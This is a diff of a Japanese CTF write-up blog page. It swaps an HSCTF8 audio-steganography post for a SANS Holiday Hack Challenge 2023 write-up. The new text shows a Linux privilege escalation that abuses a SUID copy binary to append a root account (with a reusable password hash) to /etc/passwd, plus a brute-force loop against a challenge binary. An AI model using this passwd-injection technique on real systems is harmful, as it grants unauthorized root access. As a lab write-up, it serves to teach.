@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>HSCTF8 Writeup - CTF フラxxグゲット</title>
+  <title>SANS Holiday Hack Challenge (Kringlecon) 2023 Writeup - CTF フラxxグゲット</title>
   <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
@@ -16,7 +16,7 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 
-<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.hsctf.com/ 1939点を獲得し、最終順位は406位でした。ほとんど misc しか解いてません。。 [Misc]: audio-frequency-stego Challenge What a mundane song, it&amp;rsquo;s just the same note repeated over and over. But" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2023.kringlecon.com/ 新年明けまして おめでとうございます！ SANS の Holiday Hack Challenge (Kringlecon) 2023 をちょっとだけやりました。 チャレンジ自体にたどり着くまでにア" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
 
 
 
@@ -26,7 +26,7 @@
 <meta name="generator" content="Hugo 0.74.2 with theme even" />
 
 
-<link rel="canonical" href="https://captureamerica.github.io/writeups/post/hsctf8_2021/" />
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/kringlecon_2023/" />
 <link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
@@ -39,23 +39,23 @@
 
 
 
-<meta property="og:title" content="HSCTF8 Writeup" />
-<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.hsctf.com/ 1939点を獲得し、最終順位は406位でした。ほとんど misc しか解いてません。。 [Misc]: audio-frequency-stego Challenge What a mundane song, it&rsquo;s just the same note repeated over and over. But" />
+<meta property="og:title" content="SANS Holiday Hack Challenge (Kringlecon) 2023 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2023.kringlecon.com/ 新年明けまして おめでとうございます！ SANS の Holiday Hack Challenge (Kringlecon) 2023 をちょっとだけやりました。 チャレンジ自体にたどり着くまでにア" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/hsctf8_2021/" />
-<meta property="article:published_time" content="2021-06-20T09:10:00+09:00" />
-<meta property="article:modified_time" content="2021-06-20T09:10:00+09:00" />
-<meta itemprop="name" content="HSCTF8 Writeup">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.hsctf.com/ 1939点を獲得し、最終順位は406位でした。ほとんど misc しか解いてません。。 [Misc]: audio-frequency-stego Challenge What a mundane song, it&rsquo;s just the same note repeated over and over. But">
-<meta itemprop="datePublished" content="2021-06-20T09:10:00&#43;09:00" />
-<meta itemprop="dateModified" content="2021-06-20T09:10:00&#43;09:00" />
-<meta itemprop="wordCount" content="282">
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/kringlecon_2023/" />
+<meta property="article:published_time" content="2024-01-06T12:00:00+09:00" />
+<meta property="article:modified_time" content="2024-01-06T12:00:00+09:00" />
+<meta itemprop="name" content="SANS Holiday Hack Challenge (Kringlecon) 2023 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2023.kringlecon.com/ 新年明けまして おめでとうございます！ SANS の Holiday Hack Challenge (Kringlecon) 2023 をちょっとだけやりました。 チャレンジ自体にたどり着くまでにア">
+<meta itemprop="datePublished" content="2024-01-06T12:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2024-01-06T12:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="968">
 
 
 
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="HSCTF8 Writeup"/>
-<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.hsctf.com/ 1939点を獲得し、最終順位は406位でした。ほとんど misc しか解いてません。。 [Misc]: audio-frequency-stego Challenge What a mundane song, it&rsquo;s just the same note repeated over and over. But"/>
+<meta name="twitter:title" content="SANS Holiday Hack Challenge (Kringlecon) 2023 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2023.kringlecon.com/ 新年明けまして おめでとうございます！ SANS の Holiday Hack Challenge (Kringlecon) 2023 をちょっとだけやりました。 チャレンジ自体にたどり着くまでにア"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -132,10 +132,10 @@
           <article class="post">
     
     <header class="post-header">
-      <h1 class="post-title">HSCTF8 Writeup</h1>
+      <h1 class="post-title">SANS Holiday Hack Challenge (Kringlecon) 2023 Writeup</h1>
 
       <div class="post-meta">
-        <span class="post-time"> 2021-06-20 </span>
+        <span class="post-time"> 2024-01-06 </span>
         <div class="post-category">
             <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
             </div>
@@ -148,10 +148,16 @@
   <div class="post-toc-content">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#misc-audio-frequency-stego">[Misc]: audio-frequency-stego</a>
+    <li><a href="#linux-privesc-difficulty-3">Linux PrivEsc (Difficulty: 3)</a>
       <ul>
         <li><a href="#challenge">Challenge</a></li>
         <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#hashcat-difficulty-2">Hashcat (Difficulty: 2)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
       </ul>
     </li>
   </ul>
@@ -163,39 +169,99 @@
 <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
 <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
 <div class='align-right'>
-<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fhsctf8_2021%2F">
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fkringlecon_2023%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
 </div>
-<p>URL: <a href="https://ctf.hsctf.com/">https://ctf.hsctf.com/</a>
-<br /><br />
-1939点を獲得し、最終順位は406位でした。ほとんど misc しか解いてません。。
-<br /><br />
-<img src="https://captureamerica.github.io/writeups/img/hsctf8_Score1.png" alt="hsctf8_Score1.png"></p>
-<img src="https://captureamerica.github.io/writeups/img/hsctf8_Score2.png" alt="hsctf8_Score2.png">
+<p>URL: <a href="https://2023.kringlecon.com/">https://2023.kringlecon.com/</a>
+<br /><br /></p>
+<p>新年明けまして おめでとうございます！</p>
+<p>SANS の Holiday Hack Challenge (Kringlecon) 2023 をちょっとだけやりました。</p>
+<p>チャレンジ自体にたどり着くまでにアバターを移動させないといけないのが面倒くさ過ぎて、今年も少ししかやっていません（以下）。</p>
+<p><br /></p>
+<img src="https://captureamerica.github.io/writeups/img/kringlecon_2023_Objectives.png" alt="kringlecon_2023_Objectives.png">
+<p><br /></p>
 <p><br /><br /></p>
-<h2 id="misc-audio-frequency-stego">[Misc]: audio-frequency-stego</h2>
+<h2 id="linux-privesc-difficulty-3">Linux PrivEsc (Difficulty: 3)</h2>
 <hr>
 <h3 id="challenge">Challenge</h3>
 <blockquote>
-<p>What a mundane song, it&rsquo;s just the same note repeated over and over. But could there perhaps be two different notes?</p>
+<p>Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.</p>
 </blockquote>
-<p>Attachment:</p>
-<ul>
-<li>audio_frequency_stego.wav</li>
-</ul>
+<p>（別のチャレンジ文もあったかもしれません。）</p>
 <p><br /></p>
 <h3 id="solution">Solution</h3>
-<p>wavファイルを再生してみると同じような音の繰り返し続きますが、耳を済ましてよく聞いていると音の種類が2種類あるような感じがします。</p>
-<p>聴覚だけを頼りに解けないこともないかもですが、視覚も使った方が確実だと思い、以下のように解きました。</p>
-<p>Audacityで開いてスペクトラム表示にした後、拡大してみると青色の濃いところと薄いところが見つかります。</p>
-<img src="https://captureamerica.github.io/writeups/img/hsctf8_audio_frequency_stego.png" alt="hsctf8_audio_frequency_stego.png">
-<p>それぞれ「0」と「1」の2値に割り当てると、こうなります。</p>
+<p>まずは、SUIDがセットされているファイルを探します。</p>
 <pre>
-011001100110110001100001011001110111101101110011011011000011000101100111011010000101111101110000001100010111010001100011011010000101111101100011011010000011010001101110011001110011001101111101
+$ find / -perm -u=s -type f 2>/dev/null
+:
+(snip)
+:
+/usr/bin/simplecopy
+</pre>
+<br/>
+<br/>
+<p>見慣れない simplecopy というのが居たので、実行してみます。</p>
+<pre>
+$ /usr/bin/simplecopy
+Usage: /usr/bin/simplecopy &lt;source> &lt;destination>
+</pre>
+<br/>
+<br/>
+<p>任意のファイルを上書きできそうなので、/etc/password にアカウントを追加します。</p>
+<pre>
+$ cp /etc/passwd .
+$ echo root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash >> passwd
+$ /usr/bin/simplecopy passwd /etc/passwd
+$ su root2
+Password:
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</pre>
+<p>/etc/passwd に追加するやつは使いまわしができるので、Linuxの権限昇格をよくやる人は、手元に一個持っておくといいです。</p>
+<p>上記の例だと、パスワードは、<code>mrcake</code> になります。</p>
+<p><br />
+<br /></p>
+<p>rootユーザのホーム (/root) に、runmetoanswerというファイルがあって、実行すると簡単なクイズが表示されます。</p>
+<pre>
+# /root/runmetoanswer
+Who delivers Chrismas presents?
+
+>
+</pre>
+<p>ま、サンタクロースなのは間違いないんですが、大文字小文字の区別があったり、ピッタリ回答が合わないとフラグは貰えません。</p>
+<p><br />
+<br /></p>
+<p><code>strace</code> や <code>ltrace</code> とかも使えないし、<code>strings</code> は大量のアウトプットが出るので、そこから答えのヒントを見つけるのが難しいかもしれませんが、いちおう <code>/etc/runtoanswer.yaml</code> を参照しているのは見つかります（以下）。</p>
+<img src="https://captureamerica.github.io/writeups/img/kringlecon_2023_strings.png" alt="kringlecon_2023_strings.png">
+<p><br />
+<br /></p>
+<p>自分は別の方法でこのファイル（<code>/etc/runtoanswer.yaml</code>）を見つけたと思うんですが、このブログを書いている時点で全く記憶に残っていないし、メモも取ってなかったので、わからないです。ごめんなさい。たぶん、<code>grep</code> か <code>find</code> です。</p>
+<p><br />
+<br />
+<code>/etc/runtoanswer.yaml</code> の中を見たら、答え <code>santa</code> が見つかります。</p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="hashcat-difficulty-2">Hashcat (Difficulty: 2)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!</p>
+</blockquote>
+<p>（別のチャレンジ文もあったかもしれません。）</p>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>hash.txt の中身を見ると、<code>$krb5asrep</code> で始まっていて、ググってみると <code>-m 18200</code> を指定するとよさそうなので、やってみます。</p>
+<img src="https://captureamerica.github.io/writeups/img/kringlecon_2023_hashcat.png" alt="kringlecon_2023_hashcat.png">
+<p><br /><br /></p>
+<p><code>1LuvCandyC4n3s!2022</code> か <code>iLuvCandyCan3s!23!</code> 辺りが正解なのかと思ったんですが、これらは正解ではありませんでした。</p>
+<p><br /><br /></p>
+<p>そもそも、パスワードリスト (password_list.txt) の中には、それほど沢山のパスワードは含まれていないので、Brute Forceしちゃうことにしました。</p>
+<pre>
+$ for pass in $(cat password_list.txt); do echo $pass | /bin/runtoanswer & done
 </pre>
 <p><br /></p>
-<p>Flag: <code>flag{sl1gh_p1tch_ch4ng3}</code></p>
+<p>これで <code>hashcat</code> を使わなくてもクリアできます。</p>
 <p><br /><br />
 <br /><br /></p>
 <hr>
@@ -212,7 +278,7 @@
   <p class="copyright-item">
     <span class="item-title">LastMod</span>
     <span class="item-content">
-        2021-06-20
+        2024-01-06
         
     </span>
   </p>
@@ -224,13 +290,9 @@
           <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
           </div>
       <nav class="post-nav">
-        <a class="prev" href="https://captureamerica.github.io/writeups/post/redpwnctf_2021/">
-            <i class="iconfont icon-left"></i>
-            <span class="prev-text nav-default">RedpwnCTF 2021 Writeup</span>
-            <span class="prev-text nav-mobile">Prev</span>
-          </a>
-        <a class="next" href="https://captureamerica.github.io/writeups/post/bcactf_2021/">
-            <span class="next-text nav-default">BCACTF 2.0 Writeup</span>
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/udctf_2023/">
+            <span class="next-text nav-default">UDCTF 2023 Writeup</span>
             <span class="next-text nav-mobile">Next</span>
             <i class="iconfont icon-right"></i>
           </a>
